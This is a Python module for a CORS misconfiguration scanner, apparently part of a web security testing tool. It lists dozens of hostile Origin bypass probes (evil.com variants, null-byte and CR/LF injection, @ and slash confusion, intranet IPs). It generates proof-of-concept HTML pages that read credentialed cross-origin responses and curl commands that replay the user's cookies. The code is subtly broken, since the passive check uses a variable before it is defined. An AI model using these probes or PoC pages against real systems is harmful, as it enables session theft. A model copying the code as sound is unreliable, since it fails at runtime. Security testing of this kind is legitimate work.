"""
CORS (Cross-Origin Resource Sharing) misconfiguration scan.

This file contains TWO things meant to be dropped into the project:
  1. CorsScanMixin        → replace scans/cors_scan.py entirely
  2. format_cors_results  → replace the method of the same name in ScannerTab

ATTACK CLASSES COVERED (mapped to PortSwigger research)
--------------------------------------------------------
  [A] Server reflects arbitrary Origin back (ACAO mirrors request Origin)
      → TC-01, TC-19, TC-20, TC-23, TC-24

  [B] Origin parsing / whitelist bypass
      Suffix-match  (hackersnormal-website.com accepted)  → TC-02
      Prefix-match  (normal-website.com.evil.net accepted) → TC-03
      Null-byte injection                                   → TC-16
      Regex dot-escape (targetXcom.evil.com)               → TC-17
      Backtick URL-encoded origin                           → TC-18
      Uppercase / mixed-case origin                         → TC-19, TC-20

  [C] Null origin whitelisted (sandboxed iframe attack)
      → TC-04, PF-null
      Exploit: <iframe sandbox="allow-scripts ..." src="data:text/html,...">

  [D] XSS via CORS trust relationship
      Server trusts subdomains → attacker uses XSS on trusted subdomain
      to read credentialed cross-origin responses.
      → TC-05 to TC-09 detect subdomain trust
      → TC-XSS-01 to TC-XSS-05 inject a simulated XSS origin to confirm
        the chain is exploitable (subdomain + XSS payload in path)

  [E] Breaking TLS — HTTP subdomain trusted on HTTPS target
      Server whitelists http://sub.target.com while itself running HTTPS.
      Attacker with MITM position can intercept HTTP traffic and inject
      a CORS request.
      → TC-TLS-01  http://www.{host}     (HTTP subdomain on HTTPS target)
      → TC-TLS-02  http://sub.{host}     (arbitrary HTTP subdomain)
      → TC-TLS-03  http://static.{host}
      → TC-TLS-04  http://cdn.{host}
      → TC-TLS-05  http://api.{host}

  [F] Intranet / private IP address space — wildcard without credentials
      Internal apps often use ACAO: * without ACAC.  An external attacker
      page can use the victim's browser as a proxy to read intranet content.
      → TC-PRIV-01  http://192.168.0.1
      → TC-PRIV-02  http://192.168.1.1
      → TC-PRIV-03  http://10.0.0.1
      → TC-PRIV-04  http://172.16.0.1
      → TC-PRIV-05  http://intranet.local
      → TC-PRIV-06  http://internal
      → TC-PRIV-07  http://localhost.localdomain

  [G] Localhost / loopback
      → TC-10 to TC-13

  [H] Port / scheme variations
      → TC-14, TC-15, TC-21, TC-22, TC-23

  [I] OPTIONS preflight reflection
      → PF-evil.com, PF-null, PF-sub.{host}
"""

import textwrap
import logging
import urllib.parse
from typing import Dict, Any, List, Optional

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# PoC HTML generator
# ─────────────────────────────────────────────────────────────────────────────

def _generate_poc_html(
    url: str,
    origin: str,
    method: str,
    with_credentials: bool,
    test_case: str,
) -> str:
    creds_js  = "true"  if with_credentials else "false"
    creds_xhr = "xhr.withCredentials = true;" if with_credentials else ""
    url_js    = repr(url)

    return f"""<!DOCTYPE html>
<!--
  CORS PoC  |  {test_case}
  Target  : {url}
  Origin  : {origin}
  Creds   : {with_credentials}

  USAGE: Host at {origin}/poc.html, open while logged into target, click Run.
-->
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CORS PoC -- {test_case}</title>
  <style>
    body  {{ font-family:monospace; background:#111; color:#eee; padding:2em; }}
    h2    {{ color:#f55; }}
    pre   {{ background:#1a1a1a; padding:1em; overflow:auto; max-height:420px;
            border:1px solid #444; white-space:pre-wrap; word-break:break-all; }}
    table {{ border-collapse:collapse; margin-bottom:1em; }}
    td    {{ padding:3px 12px 3px 0; color:#bbb; }}
    td:first-child {{ color:#888; white-space:nowrap; }}
    button {{ background:#9b1c1c; color:#fff; border:none; padding:.45em 1.4em;
             font-size:.95em; cursor:pointer; border-radius:4px; margin:.3em .2em; }}
    button:hover {{ background:#e53e3e; }}
  </style>
</head>
<body>
  <h2>CORS Misconfiguration PoC</h2>
  <table>
    <tr><td>Test case</td><td><b>{test_case}</b></td></tr>
    <tr><td>Target URL</td><td><b>{url}</b></td></tr>
    <tr><td>Attacker origin</td><td><b>{origin}</b></td></tr>
    <tr><td>Method</td><td><b>{method}</b></td></tr>
    <tr><td>With credentials</td>
        <td><b>{'YES -- cookies/auth headers sent' if with_credentials else 'NO'}</b></td></tr>
  </table>
  <button onclick="runFetch()">Run PoC (fetch)</button>
  <button onclick="runXHR()">Run PoC (XHR)</button>
  <button onclick="clearOut()">Clear</button>
  <h3>Response:</h3>
  <pre id="out">Click a button above...</pre>
<script>
const TARGET = {url_js};
async function runFetch() {{
  document.getElementById("out").textContent = "Sending fetch()...";
  try {{
    const r = await fetch(TARGET, {{ method:"{method}", credentials:{creds_js} }});
    const hdrs = []; r.headers.forEach((v,k)=>hdrs.push(k+": "+v));
    const body = await r.text();
    document.getElementById("out").textContent =
      "HTTP "+r.status+" "+r.statusText+"\\n"+hdrs.join("\\n")+"\\n\\n"+
      body.substring(0,8000)+(body.length>8000?"\\n[truncated...]":"");
  }} catch(e) {{
    document.getElementById("out").textContent="fetch() blocked:\\n"+e;
  }}
}}
function runXHR() {{
  document.getElementById("out").textContent = "Sending XHR...";
  const xhr = new XMLHttpRequest();
  xhr.open("{method}", TARGET, true);
  {creds_xhr}
  xhr.onload = ()=>{{
    document.getElementById("out").textContent =
      "HTTP "+xhr.status+"\\n"+xhr.getAllResponseHeaders()+"\\n"+
      xhr.responseText.substring(0,8000);
  }};
  xhr.onerror = ()=>{{ document.getElementById("out").textContent="XHR blocked."; }};
  xhr.send();
}}
function clearOut() {{ document.getElementById("out").textContent="Cleared."; }}
</script>
</body></html>"""


# ─────────────────────────────────────────────────────────────────────────────
# Severity scoring
# ─────────────────────────────────────────────────────────────────────────────

def _severity(with_credentials: bool, origin_class: str) -> Dict[str, Any]:
    """Score = (impact x exploitability) / 10, capped at 10."""
    impact_map = {True: 9.0, False: 5.0}
    exploit_map = {
        "arbitrary":  9.5,
        "generic":    9.0,
        "null":       8.0,
        "xss_chain":  8.5,   # subdomain trust + XSS chain
        "tls_break":  7.0,   # HTTP subdomain on HTTPS target (needs MITM)
        "subdomain":  6.0,
        "private_ip": 7.5,   # intranet access via victim browser as proxy
        "localhost":  4.0,
        "loopback":   3.5,
    }
    score = min(
        round((impact_map[with_credentials] * exploit_map.get(origin_class, 5.0)) / 10, 1),
        10.0,
    )
    label = (
        "CRITICAL" if score >= 8.5 else
        "HIGH"     if score >= 6.0 else
        "MEDIUM"   if score >= 4.0 else
        "LOW"
    )
    return {"label": label, "score": score}


# ─────────────────────────────────────────────────────────────────────────────
# Remediation tips
# ─────────────────────────────────────────────────────────────────────────────

def _remediation_tip(origin_class: str, with_credentials: bool) -> str:
    tips = {
        "arbitrary": (
            "Implement a strict server-side origin allowlist. "
            "Use exact string matching -- never substring, suffix, or regex."
        ),
        "generic": (
            "The server accepts any Origin. Replace wildcard ACAO with an "
            "explicit allowlist of trusted origins."
        ),
        "null": (
            "Never allowlist the 'null' origin. Sandboxed iframes and local "
            "HTML files trivially send it."
        ),
        "subdomain": (
            "Subdomain allowlists are dangerous -- any subdomain takeover or "
            "XSS becomes a CORS exploit vector. Use the narrowest allowlist possible."
        ),
        "xss_chain": (
            "The server trusts a subdomain that could carry an XSS payload in "
            "its path/query. An attacker with XSS on that subdomain can use it "
            "to read credentialed responses from this endpoint. "
            "Audit all trusted subdomains for XSS and consider removing them "
            "from the CORS allowlist."
        ),
        "tls_break": (
            "The server trusts an HTTP (plain) subdomain origin while itself "
            "running HTTPS. An attacker with a MITM position on the HTTP "
            "subdomain's traffic can inject a CORS request and read the "
            "HTTPS endpoint's credentialed response. "
            "Only allowlist HTTPS origins on HTTPS endpoints."
        ),
        "private_ip": (
            "The server accepts cross-origin requests from private/intranet "
            "IP addresses or hostnames. An attacker's external page can use "
            "the victim's browser as a proxy to reach internal resources. "
            "Internal apps should not set permissive CORS policies."
        ),
        "localhost": (
            "Do not trust localhost in production. Any local page or browser "
            "extension on the victim's machine can exploit this."
        ),
        "loopback": (
            "IPv6 ::1 equals localhost. Same risk -- do not trust in production."
        ),
    }
    tip = tips.get(origin_class, "Use an explicit, narrow origin allowlist.")
    if with_credentials:
        tip += (
            " URGENT: ACAC: true is set -- cross-origin requests carry session "
            "cookies and auth tokens. This is a direct session-hijack primitive. Fix immediately."
        )
    tip += (
        " Always return Vary: Origin to prevent caches serving a permissive "
        "CORS response to different origins."
    )
    return tip


# ─────────────────────────────────────────────────────────────────────────────
# curl repro builder
# ─────────────────────────────────────────────────────────────────────────────

def _build_repro_curl(
    method: str,
    url: str,
    origin: str,
    base_headers: Dict[str, str],
    has_auth: bool,
    extra_flags: str = "",
) -> str:
    parts = [f"curl -sk -H 'Origin: {origin}'"]
    if has_auth:
        cookie_val = base_headers.get("cookie", "")
        authz_val  = base_headers.get("authorization", "")
        if cookie_val:
            parts.append(f"-H 'Cookie: {cookie_val}'")
        if authz_val:
            parts.append(f"-H 'Authorization: {authz_val}'")
    if extra_flags:
        parts.append(extra_flags)
    parts.append(f"-X {method} '{url}' -D -")
    return " ".join(parts)


# ─────────────────────────────────────────────────────────────────────────────
# CorsScanMixin
# ─────────────────────────────────────────────────────────────────────────────

class CorsScanMixin:
    """
    Drop-in replacement CorsScanMixin for ScanWorker.

    Requires:
      self.running, self.request_data, self.scan_progress,
      self.send_request_with_traffic(url, headers, method, payload,
                                     payload_type, allow_redirects)
    """

    # ── Standard origin probes ────────────────────────────────────────────────
    # (tc_id, origin_template, description, origin_class)
    # Placeholders: {scheme}  {host}  {host_nodot}
    _CORS_PROBES: List[tuple] = [
        # [A] Reflected / arbitrary origin
        ("TC-01", "{scheme}://evil.com",
         "Arbitrary third-party origin reflected",          "arbitrary"),
        # [B] Whitelist bypass
        ("TC-02", "{scheme}://evil.{host}",
         "Suffix-match bypass -- evil.target.com",          "subdomain"),
        ("TC-03", "{scheme}://{host}.evil.com",
         "Prefix-match bypass -- target.com.evil.com",      "arbitrary"),
        # [C] Null origin
        ("TC-04", "null",
         "Null origin (sandboxed iframe / local file)",     "null"),
        # Subdomains (used by [D] XSS chain & [E] TLS break detection)
        ("TC-05", "{scheme}://sub.{host}",
         "Arbitrary subdomain trust",                       "subdomain"),
        ("TC-06", "{scheme}://www.{host}",
         "www. subdomain trust",                            "subdomain"),
        ("TC-07", "{scheme}://dev.{host}",
         "dev. subdomain trust",                            "subdomain"),
        ("TC-08", "{scheme}://staging.{host}",
         "staging. subdomain trust",                        "subdomain"),
        ("TC-09", "{scheme}://internal.{host}",
         "internal. subdomain trust",                       "subdomain"),
        # [G] Localhost / loopback
        ("TC-10", "http://localhost",
         "localhost reflection",                            "localhost"),
        ("TC-11", "http://127.0.0.1",
         "127.0.0.1 loopback",                              "loopback"),
        ("TC-12", "http://localhost:8080",
         "localhost alternate port",                        "localhost"),
        ("TC-13", "http://[::1]",
         "IPv6 loopback ::1",                               "loopback"),
        # [H] Scheme confusion
        ("TC-14", "https://evil.com",
         "HTTPS attacker origin",                           "arbitrary"),
        ("TC-15", "http://evil.com",
         "HTTP attacker origin on HTTPS endpoint",          "arbitrary"),
        # [B] Parser / regex confusion
        ("TC-16", "{scheme}://evil.com%00.{host}",
         "Null-byte injection in Origin",                   "arbitrary"),
        ("TC-17", "{scheme}://{host_nodot}x.evil.com",
         "Regex dot-escape bypass",                         "arbitrary"),
        ("TC-18", "{scheme}://{host}%60.evil.com",
         "Backtick URL-encoded origin",                     "arbitrary"),
        # [A] Case mutations
        ("TC-19", "{scheme}://EVIL.COM",
         "Uppercase origin (case-insensitive bypass)",      "arbitrary"),
        ("TC-20", "{scheme}://Evil.Com",
         "Mixed-case origin",                               "arbitrary"),
        # [H] Port variations
        ("TC-21", "{scheme}://{host}:80",
         "Same host explicit port 80",                      "subdomain"),
        ("TC-22", "{scheme}://{host}:443",
         "Same host explicit port 443",                     "subdomain"),
        ("TC-23", "{scheme}://evil.com:80",
         "Attacker origin on port 80",                      "arbitrary"),
        # [A] Generic wildcard-like
        ("TC-24", "{scheme}://notevil.com",
         "Generic third-party origin (wildcard-like policy)", "generic"),

        # ── [E] Breaking TLS — HTTP subdomain trusted on HTTPS target ─────────
        # These fire when the server is HTTPS but trusts an HTTP origin.
        # An attacker with MITM on the HTTP subdomain can inject a CORS request.
        ("TC-TLS-01", "http://www.{host}",
         "TLS break: HTTP www. subdomain trusted on HTTPS endpoint",   "tls_break"),
        ("TC-TLS-02", "http://sub.{host}",
         "TLS break: HTTP arbitrary subdomain trusted on HTTPS",        "tls_break"),
        ("TC-TLS-03", "http://static.{host}",
         "TLS break: HTTP static. subdomain trusted on HTTPS",          "tls_break"),
        ("TC-TLS-04", "http://cdn.{host}",
         "TLS break: HTTP cdn. subdomain trusted on HTTPS",             "tls_break"),
        ("TC-TLS-05", "http://api.{host}",
         "TLS break: HTTP api. subdomain trusted on HTTPS",             "tls_break"),

        # ── [F] Intranet / private IP — wildcard without credentials ──────────
        # Victim's browser used as proxy to reach internal resources.
        ("TC-PRIV-01", "http://192.168.0.1",
         "Intranet: private IP 192.168.0.1 trusted",       "private_ip"),
        ("TC-PRIV-02", "http://192.168.1.1",
         "Intranet: private IP 192.168.1.1 trusted",       "private_ip"),
        ("TC-PRIV-03", "http://10.0.0.1",
         "Intranet: private IP 10.0.0.1 trusted",          "private_ip"),
        ("TC-PRIV-04", "http://172.16.0.1",
         "Intranet: private IP 172.16.0.1 trusted",        "private_ip"),
        ("TC-PRIV-05", "http://intranet.local",
         "Intranet: .local hostname trusted",               "private_ip"),
        ("TC-PRIV-06", "http://internal",
         "Intranet: bare 'internal' hostname trusted",      "private_ip"),
        ("TC-PRIV-07", "http://localhost.localdomain",
         "Intranet: localhost.localdomain trusted",         "private_ip"),

        # ── [B] Parser confusion / whitelist bypass (bypass list #4,5,7,8,9) ──

        # Bypass #4: attackertarget.com — attacker fused directly to hostname
        # without a dot. Exploits naive endsWith("target.com") checks that forget
        # to anchor on a dot boundary.
        ("TC-FUSE-01", "{scheme}://attacker{host}",
         "Fused hostname bypass -- attackertarget.com (no dot separator)",   "arbitrary"),

        # Bypass #5: sub.attackertarget.com — subdomain of the fused hostname
        ("TC-FUSE-02", "{scheme}://sub.attacker{host}",
         "Subdomain of fused hostname -- sub.attackertarget.com",            "arbitrary"),

        # Corsy: pre-domain wildcard — "d3v" prefix fused to root (no dot)
        # Equivalent to FUSE-01 but using Corsy's exact "d3v" prefix so we
        # catch servers whose allowlist regex was built around Corsy's test input.
        ("TC-FUSE-03", "{scheme}://d3v{host}",
         "Corsy pre-domain variant: d3v fused to hostname (no dot)",         "arbitrary"),

        # Corsy: underscore bypass — root_.example.com
        # Some parsers treat underscore as a valid hostname character and a
        # suffix-match check may accept "target.com_.evil.com" as "target.com*".
        ("TC-UNDER-01", "{scheme}://{host}_.evil.com",
         "Underscore suffix bypass -- target.com_.evil.com",                 "arbitrary"),
        # Also: underscore before TLD within the target host string
        ("TC-UNDER-02", "{scheme}://evil.com_.{host}",
         "Underscore prefix bypass -- evil.com_.target.com",                 "arbitrary"),

        # Corsy: unescaped regex — replaces FIRST dot only with 'x'.
        # Corsy's exact logic: root.replace('.', 'x', 1)
        # e.g. "api.target.com" → "apix.target.com"
        # Our TC-17 replaces ALL dots. This probe covers Corsy's exact variant.
        ("TC-REGEX-FIRST", "{scheme}://{host_first_dot_x}.evil.com",
         "Unescaped regex bypass -- first dot replaced (Corsy exact variant)", "arbitrary"),

        # Corsy: http origin allowed — sends http://{same_host} (not evil.com)
        # Tests whether the server trusts its own hostname over HTTP while
        # serving over HTTPS. Different from TC-15 which uses http://evil.com.
        ("TC-HTTP-SAMEHOST", "http://{host}",
         "HTTP same-host origin on HTTPS endpoint (Corsy http allowance test)", "tls_break"),

        # Bypass #7: space in origin value.
        # Parser may split on whitespace and only validate the first token.
        ("TC-SPACE-01", "{scheme}://sub.attacker {host}",
         "Space mid-hostname in Origin (parser splits on space)",            "arbitrary"),
        ("TC-SPACE-02", " {scheme}://evil.com",
         "Leading space in Origin (whitespace trim bypass)",                 "arbitrary"),
        ("TC-SPACE-03", "{scheme}://evil.com\t.{host}",
         "Tab character in Origin hostname (parser confusion)",              "arbitrary"),

        # Bypass #8: percent-encoded chars mid-hostname.
        # TC-16=%00, TC-18=%60 already exist — these add more encoder variants.
        ("TC-PCT-01", "{scheme}://sub.attacker%25{host}",
         "Double-percent-encoded hostname (attacker%25target.com)",          "arbitrary"),
        ("TC-PCT-02", "{scheme}://sub.attacker%40{host}",
         "@ sign URL-encoded (%40) — user-info parser confusion",           "arbitrary"),
        ("TC-PCT-03", "{scheme}://attacker%09.{host}",
         "Tab URL-encoded (%09) in Origin hostname",                         "arbitrary"),
        ("TC-PCT-04", "{scheme}://attacker%0d.{host}",
         "CR (%0d) in Origin — header injection attempt",                   "arbitrary"),
        ("TC-PCT-05", "{scheme}://attacker%0a.{host}",
         "LF (%0a) in Origin — header injection attempt",                   "arbitrary"),

        # Bypass #9: slash / @ in origin — path and user-info confusion.
        # "evil.com/target.com": naive contains("target.com") check passes.
        ("TC-SLASH-01", "{scheme}://evil.com/{host}",
         "Path confusion -- evil.com/target.com (slash bypass)",             "arbitrary"),
        ("TC-SLASH-02", "{scheme}://evil.com/{host}.evil.com",
         "Path confusion with target hostname in path component",            "arbitrary"),
        # @-sign user-info trick: server string-matches "target.com" inside origin.
        ("TC-AT-01", "{scheme}://evil.com@{host}",
         "@ user-info -- evil.com@target.com (server sees target.com)",      "arbitrary"),
        ("TC-AT-02", "{scheme}://{host}@evil.com",
         "@ user-info flip -- target.com@evil.com (authority is evil.com)",  "arbitrary"),
    ]

    # ── Bypass #6: Method-switch probes ──────────────────────────────────────
    # Some servers validate Origin only on specific HTTP methods, or CORS
    # middleware routes differently by method. Strategy: try each attacker
    # origin with the flipped method (GET->POST and POST->GET) to catch
    # servers that check CORS only on one method type.
    _CORS_METHOD_SWITCH_ORIGINS: List[str] = [
        "{scheme}://evil.com",
        "{scheme}://evil.{host}",
        "{scheme}://{host}.evil.com",
        "null",
    ]

    # ── [D] XSS-via-CORS-trust probes ────────────────────────────────────────
    # Built dynamically from {host} at runtime.
    # Format: (tc_id, origin_template, description, origin_class)
    # These send a subdomain origin where the path carries an XSS marker so
    # the tester knows the exact vector when the server reflects it.
    _CORS_XSS_CHAIN_PROBES: List[tuple] = [
        ("TC-XSS-01", "{scheme}://subdomain.{host}",
         "XSS chain: subdomain.target.com trusted (XSS → CORS pivot)",    "xss_chain"),
        ("TC-XSS-02", "{scheme}://cms.{host}",
         "XSS chain: cms.target.com trusted",                              "xss_chain"),
        ("TC-XSS-03", "{scheme}://blog.{host}",
         "XSS chain: blog.target.com trusted",                             "xss_chain"),
        ("TC-XSS-04", "{scheme}://shop.{host}",
         "XSS chain: shop.target.com trusted",                             "xss_chain"),
        ("TC-XSS-05", "{scheme}://portal.{host}",
         "XSS chain: portal.target.com trusted",                           "xss_chain"),
    ]

    # ── Preflight probe origins ───────────────────────────────────────────────
    _CORS_PREFLIGHT_ORIGINS: List[str] = [
        "{scheme}://evil.com",
        "null",
        "{scheme}://sub.{host}",
    ]

    _AUTH_KEYS = frozenset({
        "cookie", "authorization", "x-auth-token",
        "x-api-key", "x-csrf-token", "x-access-token",
    })

    # ─────────────────────────────────────────────────────────────────────────
    def scan_cors(self) -> Dict[str, Any]:
        """Run the full CORS misconfiguration scan."""

        self.scan_progress.emit("🌐 [CORS] Starting scan...")

        results: Dict[str, Any] = {
            "scan_type":  "CORS",
            "vulnerable": False,
            "details":    [],
            "summary":    "",
            "pocs":       {},
            "stats": {
                "probes_sent":        0,
                "hits":               0,
                "authenticated_hits": 0,
            },
        }

        try:
            full_url = self.request_data.get("url", "")
            if not full_url:
                results["summary"] = "No URL provided."
                return results

            parsed      = urllib.parse.urlparse(full_url)
            scheme      = parsed.scheme or "https"
            host        = parsed.netloc.split(":")[0]
            same_origin = f"{parsed.scheme}://{parsed.netloc}"
            host_nodot  = host.replace(".", "x")
            # Corsy exact unescaped-regex variant: replace only the FIRST dot
            host_first_dot_x = host.replace(".", "x", 1)

            # BUG-1 fix: normalise all header keys to lowercase
            base_headers: Dict[str, str] = {}
            if self.request_data.get("headers"):
                for k, v in self.request_data["headers"].items():
                    base_headers[k.lower()] = v
            else:
                for line in self.request_data.get("request_text", "").split("\n")[1:]:
                    line = line.rstrip("\r")
                    if not line:
                        break
                    if ":" in line:
                        k, v = line.split(":", 1)
                        base_headers[k.strip().lower()] = v.strip()

            _STRIP = {"origin", "content-length", "transfer-encoding"}
            base_headers = {k: v for k, v in base_headers.items() if k not in _STRIP}

            method    = self.request_data.get("method", "GET").upper()
            _has_auth = any(k in self._AUTH_KEYS for k in base_headers)

            self.scan_progress.emit(
                f"  Auth headers: {'detected -- forwarding on all probes' if _has_auth else 'none'}"
            )

            # ── Passive check (Corsy: wildcard + third-party + invalid value) ─
            # Send one baseline request without an Origin header to read whatever
            # ACAO the server returns statically. Catches wildcard, third-party
            # allowance, and invalid/malformed ACAO values without any probing.
            self.scan_progress.emit("  [PASSIVE] Baseline request (no Origin header)...")
            results["stats"]["probes_sent"] += 1
            passive_headers = dict(base_headers)
            passive_resp = self.send_request_with_traffic(
                url             = full_url,
                headers         = passive_headers,
                method          = method,
                payload         = "",
                payload_type    = "CORS-Passive",
                allow_redirects = False,
            )
            if passive_resp and hasattr(passive_resp, "headers"):
                p_acao = (passive_resp.headers.get("Access-Control-Allow-Origin") or "").strip()
                p_acac = (passive_resp.headers.get("Access-Control-Allow-Credentials") or "").lower().strip()
                p_vary = (passive_resp.headers.get("Vary") or "").strip()
                p_with_creds = (p_acac == "true")

                passive_vuln   = False
                passive_ev     = []
                passive_oclass = "generic"

                # Corsy: wildcard value
                if p_acao == "*":
                    passive_vuln = True
                    passive_oclass = "generic"
                    if p_with_creds:
                        passive_ev.append("Static ACAO: * with ACAC: true (invalid combination)")
                    else:
                        passive_ev.append("Static ACAO: * (wildcard -- any origin can read this)")

                # Corsy: third party allowed — ACAO set to a different host statically
                elif p_acao and p_acao not in ("", same_origin, "null"):
                    try:
                        p_parsed = urllib.parse.urlparse(p_acao)
                        p_host   = p_parsed.netloc.split(":")[0]
                        if p_host and p_host != host:
                            passive_vuln   = True
                            passive_oclass = "arbitrary"
                            passive_ev.append(
                                f"Static ACAO: '{p_acao}' is a third-party domain -- "
                                "server unconditionally allows cross-origin reads"
                            )
                    except Exception:
                        pass

                # Corsy: invalid value — ACAO present but not a valid origin or *
                if p_acao and not passive_vuln:
                    is_valid_origin = (
                        p_acao == "*" or
                        p_acao == "null" or
                        (p_acao.startswith(("http://", "https://")) and "." in p_acao)
                    )
                    if not is_valid_origin:
                        passive_vuln   = True
                        passive_oclass = "generic"
                        passive_ev.append(
                            f"Invalid/malformed ACAO value: '{p_acao}' -- "
                            "server sends a broken CORS header that some browsers may accept"
                        )

                if passive_vuln:
                    missing_vary = "origin" not in p_vary.lower()
                    if missing_vary:
                        passive_ev.append("Vary: Origin absent")
                    combo = f"PASSIVE|{p_acao}|{p_acac}"
                    if combo not in _seen:
                        _seen.add(combo)
                        sev_p = _severity(p_with_creds, passive_oclass)
                        poc_p = _generate_poc_html(
                            url=full_url, origin=p_acao or "unknown",
                            method=method, with_credentials=p_with_creds,
                            test_case="TC-PASSIVE",
                        )
                        passive_finding = {
                            "test_case":      "TC-PASSIVE",
                            "description":    "Passive: static ACAO misconfiguration (no Origin probe needed)",
                            "origin_sent":    "(none -- no Origin header sent)",
                            "origin_class":   passive_oclass,
                            "auth_sent":      _has_auth,
                            "acao":           p_acao,
                            "acac":           p_acac,
                            "acam":           "",
                            "acah":           "",
                            "vary":           p_vary,
                            "missing_vary":   missing_vary,
                            "status_code":    passive_resp.status_code,
                            "confidence":     "HIGH" if (p_with_creds or p_acao == "*") else "MEDIUM",
                            "severity":       sev_p["label"],
                            "severity_score": sev_p["score"],
                            "evidence":       " | ".join(passive_ev),
                            "url":            full_url,
                            "poc_html":       poc_p,
                            "repro_curl": (
                                f"curl -sk -X {method} '{full_url}' -D - "
                                f"  # No Origin header needed -- ACAO set statically"
                            ),
                            "remediation": _remediation_tip(passive_oclass, p_with_creds),
                        }
                        results["vulnerable"] = True
                        results["stats"]["hits"] += 1
                        results["details"].append(passive_finding)
                        results["pocs"]["TC-PASSIVE"] = poc_p
                        self.scan_progress.emit(
                            f"    FINDING [{sev_p['label']}] {' | '.join(passive_ev)}"
                        )
                    else:
                        self.scan_progress.emit(f"    OK  Static ACAO='{p_acao}' -- safe")
                else:
                    self.scan_progress.emit(f"    OK  Static ACAO='{p_acao}' -- safe")

            _seen: set = set()

            # ─────────────────────────────────────────────────────────────
            # Core probe helper
            # ─────────────────────────────────────────────────────────────
            def _probe(
                tc: str,
                origin: str,
                description: str,
                origin_class: str,
                strip_auth: bool = False,
            ) -> Optional[Dict[str, Any]]:
                if not self.running:
                    return None

                headers = dict(base_headers)
                if strip_auth:
                    headers = {k: v for k, v in headers.items()
                               if k not in self._AUTH_KEYS}

                headers["origin"] = origin  # BUG-1 fix: lowercase key

                auth_label = "ANON" if strip_auth else ("AUTH" if _has_auth else "ANON")
                self.scan_progress.emit(f"  [{auth_label}][{tc}] Origin: {origin}")
                results["stats"]["probes_sent"] += 1

                # BUG-2 fix: never follow redirects
                resp = self.send_request_with_traffic(
                    url             = full_url,
                    headers         = headers,
                    method          = method,
                    payload         = origin,
                    payload_type    = f"CORS-{tc}",
                    allow_redirects = False,
                )

                if not resp or not hasattr(resp, "headers"):
                    return None

                acao = (resp.headers.get("Access-Control-Allow-Origin") or "").strip()
                acac = (resp.headers.get("Access-Control-Allow-Credentials") or "").lower().strip()
                acam = (resp.headers.get("Access-Control-Allow-Methods") or "").strip()
                acah = (resp.headers.get("Access-Control-Allow-Headers") or "").strip()
                vary = (resp.headers.get("Vary") or "").strip()

                with_creds = (acac == "true")
                vuln       = False
                evidence   = []

                # Rule 1: exact origin reflection
                if acao and acao == origin:
                    vuln = True
                    evidence.append(f"ACAO reflects injected origin: '{acao}'")

                # Rule 2: null origin accepted
                if origin == "null" and acao == "null":
                    vuln = True
                    evidence.append("ACAO: null -- sandboxed iframe origin accepted")

                # Rule 3 (BUG-3 fix): wildcard alone is a finding
                if acao == "*":
                    vuln = True
                    if with_creds:
                        evidence.append("ACAO: * + ACAC: true (invalid -- credential theft)")
                    else:
                        evidence.append("ACAO: * (wildcard -- any origin reads this response)")

                # Rule 4 (BUG-4 fix): credentials sent to non-same origin
                if with_creds and acao and acao not in ("", same_origin):
                    vuln = True
                    if not any("credential" in e for e in evidence):
                        evidence.append(
                            f"ACAC: true with ACAO: '{acao}' -- "
                            "session cookies/auth tokens sent cross-origin"
                        )

                # TLS-break specific signal: HTTP origin accepted on HTTPS target
                if (origin_class == "tls_break" and
                        origin.startswith("http://") and
                        scheme == "https" and
                        acao == origin):
                    evidence.append(
                        "HTTP origin trusted on HTTPS endpoint -- "
                        "MITM on HTTP subdomain traffic breaks TLS protection"
                    )

                # Private IP / intranet: wildcard or reflection without credentials
                if origin_class == "private_ip" and (acao == "*" or acao == origin):
                    if not with_creds:
                        evidence.append(
                            "Intranet resource accessible cross-origin without credentials -- "
                            "external attacker page can use victim browser as proxy"
                        )

                # Vary: Origin absent
                missing_vary = vuln and "origin" not in vary.lower()
                if missing_vary:
                    evidence.append(
                        "Vary: Origin absent -- CORS response may be cached cross-origin"
                    )

                if not vuln:
                    self.scan_progress.emit(f"    OK  ACAO='{acao}' ACAC='{acac}'")
                    return None

                combo = f"{tc}|{acao}|{acac}"
                if combo in _seen:
                    return None
                _seen.add(combo)

                sev          = _severity(with_creds, origin_class)
                auth_was_sent = not strip_auth and _has_auth

                poc = _generate_poc_html(
                    url=full_url, origin=origin, method=method,
                    with_credentials=with_creds, test_case=tc,
                )

                return {
                    "test_case":      tc,
                    "description":    description,
                    "origin_sent":    origin,
                    "origin_class":   origin_class,
                    "auth_sent":      auth_was_sent,
                    "acao":           acao,
                    "acac":           acac,
                    "acam":           acam,
                    "acah":           acah,
                    "vary":           vary,
                    "missing_vary":   missing_vary,
                    "status_code":    resp.status_code,
                    "confidence":     "HIGH" if (with_creds or acao == "*") else "MEDIUM",
                    "severity":       sev["label"],
                    "severity_score": sev["score"],
                    "evidence":       " | ".join(evidence),
                    "url":            full_url,
                    "poc_html":       poc,
                    "repro_curl":     _build_repro_curl(
                        method=method, url=full_url, origin=origin,
                        base_headers=base_headers, has_auth=auth_was_sent,
                    ),
                    "remediation":    _remediation_tip(origin_class, with_creds),
                }

            # ─────────────────────────────────────────────────────────────
            # Helper: run a probe list section
            # ─────────────────────────────────────────────────────────────
            def _run_probe_list(probe_list: List[tuple], section_name: str):
                self.scan_progress.emit(f"\n  -- {section_name} ({len(probe_list)} probes) --")
                for (tc, tmpl, desc, oclass) in probe_list:
                    if not self.running:
                        break
                    origin  = tmpl.format(
                        scheme=scheme, host=host,
                        host_nodot=host_nodot,
                        host_first_dot_x=host_first_dot_x,
                    )
                    finding = _probe(tc, origin, desc, oclass, strip_auth=False)
                    if not finding:
                        continue

                    results["stats"]["hits"] += 1
                    results["vulnerable"]    = True
                    results["details"].append(finding)
                    results["pocs"][tc]      = finding["poc_html"]
                    self.scan_progress.emit(
                        f"    FINDING [{finding['severity']}] {finding['evidence']}"
                    )

                    # Secondary anonymous re-probe
                    if _has_auth and self.running:
                        self.scan_progress.emit("    Checking if auth required...")
                        anon_tc = f"{tc}-ANON"
                        anon_f  = _probe(anon_tc, origin,
                                         desc + " (without auth)", oclass, strip_auth=True)
                        if anon_f:
                            anon_f["description"] += " [ALSO fires without auth]"
                            results["details"].append(anon_f)
                            results["pocs"][anon_tc] = anon_f["poc_html"]
                            self.scan_progress.emit(
                                "    Also fires WITHOUT auth -- any visitor exploitable"
                            )
                        else:
                            self.scan_progress.emit(
                                "    Requires auth -- victim must be logged in"
                            )
                            results["stats"]["authenticated_hits"] += 1

            # ── Run all probe groups ──────────────────────────────────────
